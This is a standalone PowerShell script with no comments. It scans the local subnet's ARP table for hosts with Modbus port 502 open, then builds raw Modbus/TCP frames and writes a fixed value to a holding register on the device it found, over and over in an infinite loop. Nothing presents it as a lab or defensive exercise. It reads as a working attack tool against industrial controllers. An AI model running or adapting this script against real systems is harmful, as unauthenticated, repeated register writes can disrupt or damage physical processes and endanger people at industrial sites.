$a = Get-NetIPAddress -InterfaceAlias Ethernet
$a = $a -split ' '
$a = $a[1]
$a = $a[0..10]
$a = -join $a
$x = arp -a
$x = $x | Select-String 'dynamic'
$x = $x | Select-String $a
$x = $x -split ' ' | Select-String $a
foreach ($ip in $x){if((Test-NetConnection -Computername $ip -Port 502 -WarningAction SilentlyContinue).TcpTestSucceeded){$cn = $ip}
else {$dcn = $ip}}
enum ModbusFunction {WriteSingleRegister = [byte]0x06}
function Send-ModbusCommand {param ([Parameter(Mandatory=$true)][ModbusFunction]$Function,[Parameter(Mandatory=$true)][string]$Address,[Parameter(Mandatory=$true)][uint16]$Port,[Parameter(Mandatory=$true)][uint16]$Reference,[Parameter(Mandatory=$true)][uint16[]]$Payload,[byte]$Slave = 1)
$ReferenceBytes = [System.BitConverter]::GetBytes($Reference)
[array]::Reverse($ReferenceBytes)
[byte[]]$PayloadBytes = @(0) * ($Payload.Length * 2)
for ($i = 0; $i -lt $Payload.Length; $i++){
$p = $Payload[$i]
$pBytes = [System.BitConverter]::GetBytes($p)
[array]::Reverse($pBytes)
[array]::Copy($pBytes, 0, $PayloadBytes, $i *2, 2)}
[byte[]]$tail = $Slave, $Function 
$tail += $ReferenceBytes
if ($PayloadBytes.Length -gt 0){$tail += $PayloadBytes}
[uint16]$length = $tail.Length
$lengthBytes = [System.BitConverter]::GetBytes($length)
[array]::Reverse($lengthBytes)
[byte[]]$data = 0x00, 0x01, 0x00, 0x00  
$data += $lengthBytes
$data += $tail
[byte[]] $buffer = @(0) * 1024
$tcpConnection = New-Object System.Net.Sockets.TcpClient($Address, $Port)
$tcpConnection.ReceiveTimeout = 5000
$tcpStream = $tcpConnection.GetStream()
$tcpStream.Write($data,0,$data.length)
$tcpStream.Flush()
$size = $tcpStream.Read($buffer,0,$buffer.length)
$result = @(0) * $size
[array]::copy($buffer,$result,$size)
$tcpConnection.Close()
return $result}
function Write-SingleRegister {param ([Parameter(Mandatory=$true)][string]$Address,[Parameter(Mandatory=$true)][uint16]$Port,[Parameter(Mandatory=$true)][uint16]$Reference,[Parameter(Mandatory=$true)][uint16]$Data,[byte]$Slave = 1)
$result = Send-ModbusCommand WriteSingleRegister $Address $Port $Reference @($Data) $Slave}
$Address = $cn
$Port = 502                 
$Reference = 1            
$Data = 0x0100               
$Num = 8                  
while ($true){Write-SingleRegister -Address $Address -Port $Port -Reference $Reference -Data $Data}
